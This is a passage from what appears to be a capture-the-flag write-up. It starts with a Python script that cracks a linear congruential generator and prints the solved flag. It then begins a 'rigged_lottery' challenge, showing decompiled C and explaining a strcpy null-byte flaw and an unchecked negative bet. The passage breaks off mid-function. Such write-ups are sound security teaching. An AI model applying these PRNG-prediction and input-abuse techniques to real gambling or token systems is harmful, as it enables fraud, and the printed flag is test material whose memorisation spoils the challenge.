+</span><span style="color:#ffa759;">def </span><span style="color:#ffd580;">crack_unknown_modulus</span><span>(</span><span style="color:#ffcc66;">states</span><span>):
+</span><span>    diffs </span><span style="color:#f29e74;">= </span><span>[s1 </span><span style="color:#f29e74;">- </span><span>s0 </span><span style="color:#ffa759;">for </span><span>s0</span><span style="color:#ccc9c2cc;">, </span><span>s1 </span><span style="color:#ffa759;">in </span><span style="color:#f28779;">zip</span><span>(states</span><span style="color:#ccc9c2cc;">, </span><span>states[</span><span style="color:#ffcc66;">1</span><span style="color:#ccc9c2cc;">:</span><span>])]
+</span><span>    zeroes </span><span style="color:#f29e74;">= </span><span>[t2</span><span style="color:#f29e74;">*</span><span>t0 </span><span style="color:#f29e74;">- </span><span>t1</span><span style="color:#f29e74;">*</span><span>t1 </span><span style="color:#ffa759;">for </span><span>t0</span><span style="color:#ccc9c2cc;">, </span><span>t1</span><span style="color:#ccc9c2cc;">, </span><span>t2 </span><span style="color:#ffa759;">in </span><span style="color:#f28779;">zip</span><span>(diffs</span><span style="color:#ccc9c2cc;">, </span><span>diffs[</span><span style="color:#ffcc66;">1</span><span style="color:#ccc9c2cc;">:</span><span>]</span><span style="color:#ccc9c2cc;">, </span><span>diffs[</span><span style="color:#ffcc66;">2</span><span style="color:#ccc9c2cc;">:</span><span>])]
+</span><span>    modulus </span><span style="color:#f29e74;">= </span><span style="color:#f28779;">abs</span><span>(</span><span style="color:#f28779;">reduce</span><span>(gcd</span><span style="color:#ccc9c2cc;">, </span><span>zeroes))
+</span><span>    </span><span style="color:#ffa759;">return </span><span style="color:#ffd580;">crack_unknown_multiplier</span><span>(states</span><span style="color:#ccc9c2cc;">, </span><span>modulus)
+</span><span>
+</span><span>
+</span><span>values </span><span style="color:#f29e74;">= </span><span>[
+</span><span>    </span><span style="color:#ffcc66;">585065537</span><span style="color:#ccc9c2cc;">,
+</span><span>    </span><span style="color:#ffcc66;">141094830</span><span style="color:#ccc9c2cc;">,
+</span><span>    </span><span style="color:#ffcc66;">1117894293</span><span style="color:#ccc9c2cc;">,
+</span><span>    </span><span style="color:#ffcc66;">2053819234</span><span style="color:#ccc9c2cc;">,
+</span><span>    </span><span style="color:#ffcc66;">1325680659</span><span style="color:#ccc9c2cc;">,
+</span><span>    </span><span style="color:#ffcc66;">1213377283</span><span style="color:#ccc9c2cc;">,
+</span><span>]
+</span><span>
+</span><span>n, m, c </span><span style="color:#f29e74;">= </span><span style="color:#ffd580;">crack_unknown_modulus</span><span>(values)
+</span><span style="color:#f28779;">print</span><span>(</span><span style="color:#bae67e;">&quot;n = </span><span style="color:#ffcc66;">%s</span><span style="color:#bae67e;">, m = </span><span style="color:#ffcc66;">%s</span><span style="color:#bae67e;">, c = </span><span style="color:#ffcc66;">%s</span><span style="color:#bae67e;">&quot; </span><span style="color:#f29e74;">% </span><span>(n</span><span style="color:#ccc9c2cc;">, </span><span>m</span><span style="color:#ccc9c2cc;">, </span><span>c))
+</span><span>
+</span><span style="color:#ffa759;">def </span><span style="color:#ffd580;">get_next</span><span>(</span><span style="color:#ffcc66;">num</span><span>):
+</span><span>	</span><span style="color:#ffa759;">return </span><span>(num </span><span style="color:#f29e74;">* </span><span>m) </span><span style="color:#f29e74;">% </span><span>n
+</span><span>
+</span><span style="color:#ffa759;">def </span><span style="color:#ffd580;">get_prev</span><span>(</span><span style="color:#ffcc66;">num</span><span>):
+</span><span>	</span><span style="color:#ffa759;">return </span><span style="color:#ffd580;">modinv</span><span>(m</span><span style="color:#ccc9c2cc;">,</span><span>n) </span><span style="color:#f29e74;">* </span><span>num </span><span style="color:#f29e74;">% </span><span>n
+</span><span>
+</span><span>values</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">append</span><span>(</span><span style="color:#ffd580;">get_next</span><span>(values[</span><span style="color:#f29e74;">-</span><span style="color:#ffcc66;">1</span><span>]))
+</span><span style="color:#f28779;">print</span><span>(</span><span style="color:#bae67e;">&quot;predicted year = </span><span style="color:#ffcc66;">%s</span><span style="color:#bae67e;">&quot; </span><span style="color:#f29e74;">% </span><span>values[</span><span style="color:#f29e74;">-</span><span style="color:#ffcc66;">1</span><span>])
+</span><span>
+</span><span>hops </span><span style="color:#f29e74;">= </span><span style="color:#ffcc66;">876578
+</span><span>
+</span><span style="color:#f28779;">print</span><span>(</span><span style="color:#bae67e;">&quot;seed = </span><span style="color:#ffcc66;">%s</span><span style="color:#bae67e;">&quot; </span><span style="color:#f29e74;">% </span><span style="color:#f28779;">reduce</span><span>(</span><span style="color:#ffa759;">lambda </span><span style="color:#ffcc66;">acc</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">x</span><span>: </span><span style="color:#ffd580;">get_prev</span><span>(acc)</span><span style="color:#ccc9c2cc;">, </span><span>[x </span><span style="color:#ffa759;">for </span><span>x </span><span style="color:#ffa759;">in </span><span style="color:#f28779;">range</span><span>(hops)]</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">2020</span><span>))
+</span></code></pre>
+<p>flag: HTB{l1n34r_c0n9ru3nc35_4nd_prn91Zz}</p>
+<h1 id="rigged-lottery">rigged_lottery</h1>
+<pre data-lang="text" style="background-color:#212733;color:#ccc9c2;" class="language-text "><code class="language-text" data-lang="text"><span>Is everything in life completely random? Are we unable to change our fate? Or maybe we can change the future and even manipulate randomness?! Is luck even a thing? Try your &quot;luck&quot;!
+</span></code></pre>
+<h2 id="initial-review-1">initial review</h2>
+<h3 id="main">main</h3>
+<pre data-lang="c" style="background-color:#212733;color:#ccc9c2;" class="language-c "><code class="language-c" data-lang="c"><span style="color:#ffa759;">void </span><span style="color:#ffd580;">main</span><span>(</span><span style="color:#ffa759;">void</span><span>)
+</span><span>
+</span><span>{
+</span><span>  </span><span style="color:#ffd580;">setup</span><span>()</span><span style="color:#ccc9c2cc;">;
+</span><span>  </span><span style="color:#ffd580;">welcome</span><span>()</span><span style="color:#ccc9c2cc;">;
+</span><span>  </span><span style="color:#ffd580;">generate</span><span>()</span><span style="color:#ccc9c2cc;">;
+</span><span>  </span><span style="color:#ffa759;">do </span><span>{
+</span><span>    </span><span style="color:#ffd580;">menu</span><span>()</span><span style="color:#ccc9c2cc;">;
+</span><span>  } </span><span style="color:#ffa759;">while</span><span>( </span><span style="color:#ffcc66;">true </span><span>)</span><span style="color:#ccc9c2cc;">;
+</span><span>}
+</span></code></pre>
+<p>I will omit setup &amp; welcome because they don't have anything interesting -- just writing a welcome message and setting io buffer settings.  Otherwise, nothing interesting to note here except that generate gets called once before we get to do anything.</p>
+<h3 id="generate">generate</h3>
+<pre data-lang="c" style="background-color:#212733;color:#ccc9c2;" class="language-c "><code class="language-c" data-lang="c"><span style="color:#ffa759;">void </span><span style="color:#ffd580;">generate</span><span>(</span><span style="color:#ffa759;">void</span><span>)
+</span><span>
+</span><span>{
+</span><span>  </span><span style="color:#ffa759;">long</span><span> in_FS_OFFSET</span><span style="color:#ccc9c2cc;">;
+</span><span>  </span><span style="color:#ffa759;">int</span><span> local_44</span><span style="color:#ccc9c2cc;">;
+</span><span>  </span><span style="color:#ffa759;">int</span><span> local_40</span><span style="color:#ccc9c2cc;">;
+</span><span>  </span><span style="color:#ffa759;">int</span><span> local_3c</span><span style="color:#ccc9c2cc;">;
+</span><span>  </span><span style="color:#ffa759;">char</span><span> local_38 [</span><span style="color:#ffcc66;">40</span><span>]</span><span style="color:#ccc9c2cc;">;
+</span><span>  </span><span style="color:#ffa759;">long</span><span> local_10</span><span style="color:#ccc9c2cc;">;
+</span><span>  
+</span><span>  local_10 </span><span style="color:#f29e74;">= *</span><span>(</span><span style="color:#ffa759;">long </span><span style="color:#f29e74;">*</span><span>)(in_FS_OFFSET </span><span style="color:#f29e74;">+ </span><span style="color:#ffcc66;">0x28</span><span>)</span><span style="color:#ccc9c2cc;">;
+</span><span>  local_44 </span><span style="color:#f29e74;">= </span><span style="color:#ffcc66;">1</span><span style="color:#ccc9c2cc;">;
+</span><span>  local_40 </span><span style="color:#f29e74;">= </span><span style="color:#ffcc66;">0</span><span style="color:#ccc9c2cc;">;
+</span><span>  </span><span style="color:#ffa759;">if </span><span>(_flag </span><span style="color:#f29e74;">== </span><span style="color:#ffcc66;">0</span><span>) {
+</span><span>    </span><span style="color:#f28779;">printf</span><span>(</span><span style="color:#bae67e;">&quot;</span><span style="color:#95e6cb;">\n</span><span style="color:#bae67e;">Length of number (1-32): &quot;</span><span>)</span><span style="color:#ccc9c2cc;">;
+</span><span>    </span><span style="color:#ffd580;">__isoc99_scanf</span><span>(</span><span style="color:#f29e74;">&amp;</span><span>DAT_00102073</span><span style="color:#ccc9c2cc;">,</span><span style="color:#f29e74;">&amp;</span><span>local_44)</span><span style="color:#ccc9c2cc;">;
+</span><span>    </span><span style="color:#ffa759;">if </span><span>((local_44 </span><span style="color:#f29e74;">&lt; </span><span style="color:#ffcc66;">0x22</span><span>) </span><span style="color:#f29e74;">&amp;&amp; </span><span>(</span><span style="color:#f29e74;">-</span><span style="color:#ffcc66;">1 </span><span style="color:#f29e74;">&lt;</span><span> local_44)) {
+</span><span>      </span><span style="color:#f28779;">memset</span><span>(local_38</span><span style="color:#ccc9c2cc;">,</span><span style="color:#ffcc66;">0</span><span style="color:#ccc9c2cc;">,</span><span>(</span><span style="color:#ffa759;">long</span><span>)local_44)</span><span style="color:#ccc9c2cc;">;
+</span><span>      local_3c </span><span style="color:#f29e74;">= </span><span style="color:#ffd580;">open</span><span>(</span><span style="color:#bae67e;">&quot;/dev/urandom&quot;</span><span style="color:#ccc9c2cc;">,</span><span style="color:#ffcc66;">0</span><span>)</span><span style="color:#ccc9c2cc;">;
+</span><span>      </span><span style="color:#ffa759;">if </span><span>(local_3c </span><span style="color:#f29e74;">&lt; </span><span style="color:#ffcc66;">0</span><span>) {
+</span><span>        </span><span style="color:#f28779;">fwrite</span><span>(</span><span style="color:#bae67e;">&quot;</span><span style="color:#95e6cb;">\n</span><span style="color:#bae67e;">Error opening /dev/urandom, exiting..</span><span style="color:#95e6cb;">\n</span><span style="color:#bae67e;">&quot;</span><span style="color:#ccc9c2cc;">,</span><span style="color:#ffcc66;">1</span><span style="color:#ccc9c2cc;">,</span><span style="color:#ffcc66;">0x27</span><span style="color:#ccc9c2cc;">,</span><span>stderr)</span><span style="color:#ccc9c2cc;">;
+</span><span>                    </span><span style="font-style:italic;color:#5c6773;">/* WARNING: Subroutine does not return */
+</span><span>        </span><span style="color:#f28779;">exit</span><span>(</span><span style="color:#ffcc66;">0x69</span><span>)</span><span style="color:#ccc9c2cc;">;
+</span><span>      }
+</span><span>      </span><span style="color:#ffd580;">read</span><span>(local_3c</span><span style="color:#ccc9c2cc;">,</span><span>local_38</span><span style="color:#ccc9c2cc;">,</span><span>(</span><span style="color:#ffa759;">long</span><span>)local_44)</span><span style="color:#ccc9c2cc;">;
+</span><span>      </span><span style="color:#ffa759;">while </span><span>(local_40 </span><span style="color:#f29e74;">&lt;</span><span> local_44) {
+</span><span>        </span><span style="color:#ffa759;">while </span><span>(local_38[local_40] </span><span style="color:#f29e74;">== </span><span style="color:#bae67e;">&#39;</span><span style="color:#95e6cb;">\0</span><span style="color:#bae67e;">&#39;</span><span>) {
+</span><span>          </span><span style="color:#ffd580;">read</span><span>(local_3c</span><span style="color:#ccc9c2cc;">,</span><span>local_38 </span><span style="color:#f29e74;">+</span><span> local_40</span><span style="color:#ccc9c2cc;">,</span><span style="color:#ffcc66;">1</span><span>)</span><span style="color:#ccc9c2cc;">;
+</span><span>        }
+</span><span>        local_40 </span><span style="color:#f29e74;">=</span><span> local_40 </span><span style="color:#f29e74;">+ </span><span style="color:#ffcc66;">1</span><span style="color:#ccc9c2cc;">;
+</span><span>      }
+</span><span>      </span><span style="color:#f28779;">strcpy</span><span>(lucky_number</span><span style="color:#ccc9c2cc;">,</span><span>local_38)</span><span style="color:#ccc9c2cc;">;
+</span><span>      </span><span style="color:#ffd580;">close</span><span>(local_3c)</span><span style="color:#ccc9c2cc;">;
+</span><span>      </span><span style="color:#f28779;">puts</span><span>(</span><span style="color:#bae67e;">&quot;</span><span style="color:#95e6cb;">\n</span><span style="color:#bae67e;">Lucky number generated successfuly! Try your luck!&quot;</span><span>)</span><span style="color:#ccc9c2cc;">;
+</span><span>    }
+</span><span>    </span><span style="color:#ffa759;">else </span><span>{
+</span><span>      </span><span style="color:#f28779;">puts</span><span>(</span><span style="color:#bae67e;">&quot;</span><span style="color:#95e6cb;">\n</span><span style="color:#bae67e;">Invalid size!&quot;</span><span>)</span><span style="color:#ccc9c2cc;">;
+</span><span>    }
+</span><span>  }
+</span><span>  </span><span style="color:#ffa759;">else </span><span>{
+</span><span>    _flag </span><span style="color:#f29e74;">= </span><span style="color:#ffcc66;">0</span><span style="color:#ccc9c2cc;">;
+</span><span>    local_3c </span><span style="color:#f29e74;">= </span><span style="color:#ffd580;">open</span><span>(</span><span style="color:#bae67e;">&quot;/dev/urandom&quot;</span><span style="color:#ccc9c2cc;">,</span><span style="color:#ffcc66;">0</span><span>)</span><span style="color:#ccc9c2cc;">;
+</span><span>    </span><span style="color:#ffa759;">if </span><span>(local_3c </span><span style="color:#f29e74;">&lt; </span><span style="color:#ffcc66;">0</span><span>) {
+</span><span>      </span><span style="color:#f28779;">fwrite</span><span>(</span><span style="color:#bae67e;">&quot;</span><span style="color:#95e6cb;">\n</span><span style="color:#bae67e;">Error opening /dev/urandom, exiting..</span><span style="color:#95e6cb;">\n</span><span style="color:#bae67e;">&quot;</span><span style="color:#ccc9c2cc;">,</span><span style="color:#ffcc66;">1</span><span style="color:#ccc9c2cc;">,</span><span style="color:#ffcc66;">0x27</span><span style="color:#ccc9c2cc;">,</span><span>stderr)</span><span style="color:#ccc9c2cc;">;
+</span><span>                    </span><span style="font-style:italic;color:#5c6773;">/* WARNING: Subroutine does not return */
+</span><span>      </span><span style="color:#f28779;">exit</span><span>(</span><span style="color:#ffcc66;">0x22</span><span>)</span><span style="color:#ccc9c2cc;">;
+</span><span>    }
+</span><span>    </span><span style="color:#ffd580;">read</span><span>(local_3c</span><span style="color:#ccc9c2cc;">,</span><span>lucky_number</span><span style="color:#ccc9c2cc;">,</span><span style="color:#ffcc66;">0x21</span><span>)</span><span style="color:#ccc9c2cc;">;
+</span><span>    </span><span style="color:#ffd580;">close</span><span>(local_3c)</span><span style="color:#ccc9c2cc;">;
+</span><span>  }
+</span><span>  </span><span style="color:#ffa759;">if </span><span>(local_10 </span><span style="color:#f29e74;">!= *</span><span>(</span><span style="color:#ffa759;">long </span><span style="color:#f29e74;">*</span><span>)(in_FS_OFFSET </span><span style="color:#f29e74;">+ </span><span style="color:#ffcc66;">0x28</span><span>)) {
+</span><span>                    </span><span style="font-style:italic;color:#5c6773;">/* WARNING: Subroutine does not return */
+</span><span>    </span><span style="color:#ffd580;">__stack_chk_fail</span><span>()</span><span style="color:#ccc9c2cc;">;
+</span><span>  }
+</span><span>  </span><span style="color:#ffa759;">return</span><span style="color:#ccc9c2cc;">;
+</span><span>}
+</span></code></pre>
+<p>The generate function has two main branches: the else branch runs the first time this function is called and populates <code>lucky_number</code> with random numbers.  The <code>if _flag == 0</code> branch runs any time after the first because <code>_flag</code> is set to 0 in the else branch.  It will ask for a number between 0 and 32, read that many bytes from /dev/urandom, and then use <code>strcpy</code> to move those bytes to <code>lucky_number</code>.  It should be noted that <code>strcpy</code> is meant to copy strings not raw bytes and has a couple peculiarites.  Namely that it also copies the terminating null byte from the source (because C strings are always null terminated).  The implication here is that if we generate a number of bytes smaller than the max size of <code>lucky_number</code> it will leave a null byte in <code>lucky_number</code></p>
+<h3 id="menu">menu</h3>
+<pre data-lang="c" style="background-color:#212733;color:#ccc9c2;" class="language-c "><code class="language-c" data-lang="c"><span style="color:#ffa759;">void </span><span style="color:#ffd580;">menu</span><span>(</span><span style="color:#ffa759;">void</span><span>)
+</span><span>
+</span><span>{
+</span><span>  </span><span style="color:#ffa759;">long</span><span> in_FS_OFFSET</span><span style="color:#ccc9c2cc;">;
+</span><span>  </span><span style="color:#ffa759;">int</span><span> local_14</span><span style="color:#ccc9c2cc;">;
+</span><span>  </span><span style="color:#ffa759;">long</span><span> local_10</span><span style="color:#ccc9c2cc;">;
+</span><span>  
+</span><span>  local_10 </span><span style="color:#f29e74;">= *</span><span>(</span><span style="color:#ffa759;">long </span><span style="color:#f29e74;">*</span><span>)(in_FS_OFFSET </span><span style="color:#f29e74;">+ </span><span style="color:#ffcc66;">0x28</span><span>)</span><span style="color:#ccc9c2cc;">;
+</span><span>  </span><span style="color:#f28779;">printf</span><span>((</span><span style="color:#ffa759;">char </span><span style="color:#f29e74;">*</span><span>)(</span><span style="color:#ffa759;">double</span><span>)cosy_coins</span><span style="color:#ccc9c2cc;">,
+</span><span>                  
+</span><span>         </span><span style="color:#bae67e;">&quot;</span><span style="color:#95e6cb;">\n</span><span style="color:#bae67e;">Current cosy coins: </span><span style="color:#ffcc66;">%.2f</span><span style="color:#95e6cb;">\n\n</span><span style="color:#bae67e;">1. Generate lucky number.</span><span style="color:#95e6cb;">\n</span><span style="color:#bae67e;">2. Play game.</span><span style="color:#95e6cb;">\n</span><span style="color:#bae67e;">3. Claimprize.</span><span style="color:#95e6cb;">\n</span><span style="color:#bae67e;">4. Exit.</span><span style="color:#95e6cb;">\n</span><span style="color:#bae67e;">&quot;
+</span><span>        )</span><span style="color:#ccc9c2cc;">;
+</span><span>  </span><span style="color:#ffd580;">__isoc99_scanf</span><span>(</span><span style="color:#f29e74;">&amp;</span><span>DAT_00102073</span><span style="color:#ccc9c2cc;">,</span><span style="color:#f29e74;">&amp;</span><span>local_14)</span><span style="color:#ccc9c2cc;">;
+</span><span>  </span><span style="color:#ffa759;">if </span><span>(local_14 </span><span style="color:#f29e74;">== </span><span style="color:#ffcc66;">4</span><span>) {
+</span><span>    </span><span style="color:#f28779;">puts</span><span>(</span><span style="color:#bae67e;">&quot;Goodbye!</span><span style="color:#95e6cb;">\n</span><span style="color:#bae67e;">&quot;</span><span>)</span><span style="color:#ccc9c2cc;">;
+</span><span>                    </span><span style="font-style:italic;color:#5c6773;">/* WARNING: Subroutine does not return */
+</span><span>    </span><span style="color:#f28779;">exit</span><span>(</span><span style="color:#ffcc66;">0x45</span><span>)</span><span style="color:#ccc9c2cc;">;
+</span><span>  }
+</span><span>  </span><span style="color:#ffa759;">if </span><span>(local_14 </span><span style="color:#f29e74;">&lt; </span><span style="color:#ffcc66;">5</span><span>) {
+</span><span>    </span><span style="color:#ffa759;">if </span><span>(local_14 </span><span style="color:#f29e74;">== </span><span style="color:#ffcc66;">3</span><span>) {
+</span><span>      </span><span style="color:#ffd580;">claim</span><span>()</span><span style="color:#ccc9c2cc;">;
+</span><span>      </span><span style="color:#ffa759;">goto</span><span> code_r0x0010174a</span><span style="color:#ccc9c2cc;">;
+</span><span>    }
+</span><span>    </span><span style="color:#ffa759;">if </span><span>(local_14 </span><span style="color:#f29e74;">&lt; </span><span style="color:#ffcc66;">4</span><span>) {
+</span><span>      </span><span style="color:#ffa759;">if </span><span>(local_14 </span><span style="color:#f29e74;">== </span><span style="color:#ffcc66;">1</span><span>) {
+</span><span>        </span><span style="color:#ffd580;">generate</span><span>()</span><span style="color:#ccc9c2cc;">;
+</span><span>        </span><span style="color:#ffa759;">goto</span><span> code_r0x0010174a</span><span style="color:#ccc9c2cc;">;
+</span><span>      }
+</span><span>      </span><span style="color:#ffa759;">if </span><span>(local_14 </span><span style="color:#f29e74;">== </span><span style="color:#ffcc66;">2</span><span>) {
+</span><span>        </span><span style="color:#ffd580;">play</span><span>()</span><span style="color:#ccc9c2cc;">;
+</span><span>        </span><span style="color:#ffa759;">goto</span><span> code_r0x0010174a</span><span style="color:#ccc9c2cc;">;
+</span><span>      }
+</span><span>    }
+</span><span>  }
+</span><span>  </span><span style="color:#f28779;">puts</span><span>(</span><span style="color:#bae67e;">&quot;Invalid option!</span><span style="color:#95e6cb;">\n</span><span style="color:#bae67e;">&quot;</span><span>)</span><span style="color:#ccc9c2cc;">;
+</span><span>  </span><span style="color:#ffd580;">menu</span><span>()</span><span style="color:#ccc9c2cc;">;
+</span><span style="color:#73d0ff;">code_r0x0010174a</span><span style="color:#ccc9c2cc;">:
+</span><span>  </span><span style="color:#ffa759;">if </span><span>(local_10 </span><span style="color:#f29e74;">== *</span><span>(</span><span style="color:#ffa759;">long </span><span style="color:#f29e74;">*</span><span>)(in_FS_OFFSET </span><span style="color:#f29e74;">+ </span><span style="color:#ffcc66;">0x28</span><span>)) {
+</span><span>    </span><span style="color:#ffa759;">return</span><span style="color:#ccc9c2cc;">;
+</span><span>  }
+</span><span>                    </span><span style="font-style:italic;color:#5c6773;">/* WARNING: Subroutine does not return */
+</span><span>  </span><span style="color:#ffd580;">__stack_chk_fail</span><span>()</span><span style="color:#ccc9c2cc;">;
+</span><span>}
+</span></code></pre>
+<p>Nothing super interesting here: we can either regenerate lucky numbers, play the game, or claim a prize.</p>
+<h3 id="play">play</h3>
+<pre data-lang="c" style="background-color:#212733;color:#ccc9c2;" class="language-c "><code class="language-c" data-lang="c"><span style="color:#ffa759;">void </span><span style="color:#ffd580;">play</span><span>(</span><span style="color:#ffa759;">void</span><span>)
+</span><span>
+</span><span>{
+</span><span>  </span><span style="color:#ffa759;">int</span><span> iVar1</span><span style="color:#ccc9c2cc;">;
+</span><span>  </span><span style="color:#ffa759;">long</span><span> in_FS_OFFSET</span><span style="color:#ccc9c2cc;">;
+</span><span>  </span><span style="color:#ffa759;">float</span><span> local_18</span><span style="color:#ccc9c2cc;">;
+</span><span>  </span><span style="color:#ffa759;">int</span><span> local_14</span><span style="color:#ccc9c2cc;">;
+</span><span>  </span><span style="color:#ffa759;">long</span><span> local_10</span><span style="color:#ccc9c2cc;">;
+</span><span>  
+</span><span>  local_10 </span><span style="color:#f29e74;">= *</span><span>(</span><span style="color:#ffa759;">long </span><span style="color:#f29e74;">*</span><span>)(in_FS_OFFSET </span><span style="color:#f29e74;">+ </span><span style="color:#ffcc66;">0x28</span><span>)</span><span style="color:#ccc9c2cc;">;
+</span><span>  </span><span style="color:#f28779;">puts</span><span>(</span><span style="color:#bae67e;">&quot;</span><span style="color:#95e6cb;">\n</span><span style="color:#bae67e;">How many coins do you want to bet?&quot;</span><span>)</span><span style="color:#ccc9c2cc;">;
+</span><span>  </span><span style="color:#ffd580;">__isoc99_scanf</span><span>(</span><span style="color:#f29e74;">&amp;</span><span>DAT_001020e4</span><span style="color:#ccc9c2cc;">,</span><span style="color:#f29e74;">&amp;</span><span>local_18)</span><span style="color:#ccc9c2cc;">;
+</span><span>  cosy_coins </span><span style="color:#f29e74;">=</span><span> cosy_coins </span><span style="color:#f29e74;">-</span><span> local_18</span><span style="color:#ccc9c2cc;">;
+</span><span>  iVar1 </span><span style="color:#f29e74;">= </span><span style="color:#ffd580;">coin_check</span><span>((ulong)(</span><span style="font-style:italic;color:#5ccfe6;">uint</span><span>)cosy_coins)</span><span style="color:#ccc9c2cc;">;
+</span><span>  </span><span style="color:#ffa759;">if </span><span>(iVar1 </span><span style="color:#f29e74;">!= </span><span style="color:#ffcc66;">0</span><span>) {
+</span><span>    local_14 </span><span style="color:#f29e74;">= </span><span style="color:#ffd580;">open</span><span>(</span><span style="color:#bae67e;">&quot;/dev/urandom&quot;</span><span style="color:#ccc9c2cc;">,</span><span style="color:#ffcc66;">0</span><span>)</span><span style="color:#ccc9c2cc;">;
+</span><span>    </span><span style="color:#ffa759;">if </span><span>(local_14 </span><span style="color:#f29e74;">&lt; </span><span style="color:#ffcc66;">0</span><span>) {
+</span><span>      </span><span style="color:#f28779;">fwrite</span><span>(</span><span style="color:#bae67e;">&quot;</span><span style="color:#95e6cb;">\n</span><span style="color:#bae67e;">Error opening /dev/urandom, exiting..</span><span style="color:#95e6cb;">\n</span><span style="color:#bae67e;">&quot;</span><span style="color:#ccc9c2cc;">,</span><span style="color:#ffcc66;">1</span><span style="color:#ccc9c2cc;">,</span><span style="color:#ffcc66;">0x27</span><span style="color:#ccc9c2cc;">,</span><span>stderr)</span><span style="color:#ccc9c2cc;">;
+</span><span>                    </span><span style="font-style:italic;color:#5c6773;">/* WARNING: Subroutine does not return */
+</span><span>      </span><span style="color:#f28779;">exit</span><span>(</span><span style="color:#ffcc66;">0x22</span><span>)</span><span style="color:#ccc9c2cc;">;
+</span><span>    }
+</span><span>    </span><span style="color:#ffd580;">read</span><span>(local_14</span><span style="color:#ccc9c2cc;">,</span><span>rigged_number</span><span style="color:#ccc9c2cc;">,</span><span style="color:#ffcc66;">0x31</span><span>)</span><span style="color:#ccc9c2cc;">;
+</span><span>    </span><span style="color:#ffd580;">close</span><span>(local_14)</span><span style="color:#ccc9c2cc;">;
+</span><span>    iVar1 </span><span style="color:#f29e74;">= </span><span style="color:#f28779;">strcmp</span><span>(lucky_number</span><span style="color:#ccc9c2cc;">,</span><span>rigged_number)</span><span style="color:#ccc9c2cc;">;
+</span><span>    </span><span style="color:#ffa759;">if </span><span>(iVar1 </span><span style="color:#f29e74;">== </span><span style="color:#ffcc66;">0</span><span>) {
+</span><span>      </span><span style="color:#f28779;">puts</span><span>(</span><span style="color:#bae67e;">&quot;</span><span style="color:#95e6cb;">\n</span><span style="color:#bae67e;">You won! Claim your reward!&quot;</span><span>)</span><span style="color:#ccc9c2cc;">;
+</span><span>      prize_flag </span><span style="color:#f29e74;">= </span><span style="color:#ffcc66;">1</span><span style="color:#ccc9c2cc;">;
+</span><span>    }
+</span><span>    </span><span style="color:#ffa759;">else </span><span>{
+</span><span>      </span><span style="color:#f28779;">puts</span><span>(</span><span style="color:#bae67e;">&quot;</span><span style="color:#95e6cb;">\n</span><span style="color:#bae67e;">You lost! Try again!&quot;</span><span>)</span><span style="color:#ccc9c2cc;">;
+</span><span>    }
+</span><span>  }
+</span><span>  </span><span style="color:#ffa759;">if </span><span>(local_10 </span><span style="color:#f29e74;">!= *</span><span>(</span><span style="color:#ffa759;">long </span><span style="color:#f29e74;">*</span><span>)(in_FS_OFFSET </span><span style="color:#f29e74;">+ </span><span style="color:#ffcc66;">0x28</span><span>)) {
+</span><span>                    </span><span style="font-style:italic;color:#5c6773;">/* WARNING: Subroutine does not return */
+</span><span>    </span><span style="color:#ffd580;">__stack_chk_fail</span><span>()</span><span style="color:#ccc9c2cc;">;
+</span><span>  }
+</span><span>  </span><span style="color:#ffa759;">return</span><span style="color:#ccc9c2cc;">;
+</span><span>}
+</span></code></pre>
+<p>We win if our lucky number is the same as the random numbers it generates.  It's using /dev/urandom so that doesn't seem very easy to attack.  The only thing I can think of would be getting a null byte into the first byte of <code>lucky_number</code> and then trying repeatedly until <code>/dev/urandom</code> gives us a null byte in the first byte of <code>rigged_number</code>.  It also doesn't do any bounds checking on the number of coins we bet which means we can bet a negative number of coins and get an arbitrary number of coins that way.</p>
+<h3 id="claim">claim</h3>
+<pre data-lang="c" style="background-color:#212733;color:#ccc9c2;" class="language-c "><code class="language-c" data-lang="c"><span style="color:#ffa759;">void </span><span style="color:#ffd580;">claim</span><span>(</span><span style="color:#ffa759;">void</span><span>)
+</span><span>
+</span><span>{
+</span><span>  </span><span style="color:#ffa759;">int</span><span> __fd</span><span style="color:#ccc9c2cc;">;
+</span><span>  </span><span style="color:#ffa759;">long</span><span> in_FS_OFFSET</span><span style="color:#ccc9c2cc;">;
+</span><span>  </span><span style="color:#ffa759;">int</span><span> local_40</span><span style="color:#ccc9c2cc;">;
+</span><span>  byte local_38 [</span><span style="color:#ffcc66;">40</span><span>]</span><span style="color:#ccc9c2cc;">;
+</span><span>  </span><span style="color:#ffa759;">long</span><span> local_10</span><span style="color:#ccc9c2cc;">;
+</span><span>  
+</span><span>  local_10 </span><span style="color:#f29e74;">= *</span><span>(</span><span style="color:#ffa759;">long </span><span style="color:#f29e74;">*</span><span>)(in_FS_OFFSET </span><span style="color:#f29e74;">+ </span><span style="color:#ffcc66;">0x28</span><span>)</span><span style="color:#ccc9c2cc;">;
+</span><span>  </span><span style="color:#ffa759;">if </span><span>((prize_flag </span><span style="color:#f29e74;">== </span><span style="color:#ffcc66;">0</span><span>) </span><span style="color:#f29e74;">&amp;&amp; </span><span>(cosy_coins </span><span style="color:#f29e74;">&lt;= </span><span style="color:#ffcc66;">100</span><span style="color:#ccc9c2cc;">.</span><span style="color:#ffcc66;">00000000</span><span>)) {
+</span><span>    </span><span style="color:#f28779;">puts</span><span>(</span><span style="color:#bae67e;">&quot;</span><span style="color:#95e6cb;">\n</span><span style="color:#bae67e;">No prizes available!&quot;</span><span>)</span><span style="color:#ccc9c2cc;">;
+</span><span>    </span><span style="color:#ffa759;">if </span><span>(local_10 </span><span style="color:#f29e74;">!= *</span><span>(</span><span style="color:#ffa759;">long </span><span style="color:#f29e74;">*</span><span>)(in_FS_OFFSET </span><span style="color:#f29e74;">+ </span><span style="color:#ffcc66;">0x28</span><span>)) {
+</span><span>                    </span><span style="font-style:italic;color:#5c6773;">/* WARNING: Subroutine does not return */
+</span><span>      </span><span style="color:#ffd580;">__stack_chk_fail</span><span>()</span><span style="color:#ccc9c2cc;">;
+</span><span>    }
+</span><span>    </span><span style="color:#ffa759;">return</span><span style="color:#ccc9c2cc;">;
+</span><span>  }
+</span><span>  </span><span style="color:#f28779;">puts</span><span>(</span><span style="color:#bae67e;">&quot;</span><span style="color:#95e6cb;">\n</span><span style="color:#bae67e;">Enjoy your prize!!</span><span style="color:#95e6cb;">\n</span><span style="color:#bae67e;">&quot;</span><span>)</span><span style="color:#ccc9c2cc;">;
